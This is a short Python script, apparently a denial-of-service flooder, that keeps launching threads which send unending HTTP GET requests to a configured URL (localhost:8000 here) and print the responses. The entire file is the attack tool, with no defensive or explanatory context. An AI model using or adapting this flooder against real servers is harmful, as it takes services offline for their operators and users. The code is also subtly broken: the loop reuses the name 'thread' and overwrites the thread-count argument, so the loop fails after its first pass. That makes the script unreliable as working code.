import requests
import threading
import time
url = "http://localhost:8000"

def send_request():
    while True:
        try:
            response = requests.get(url)
            print(f"Response Code: {response.status_code}")
        except:
            print("Error")
def start_dos(thread,delay):
    while True:
        for _ in range(thread):
            thread = threading.Thread(target=send_request)
            thread.start()
        time.sleep(delay)
start_dos(thread=5,delay=1)
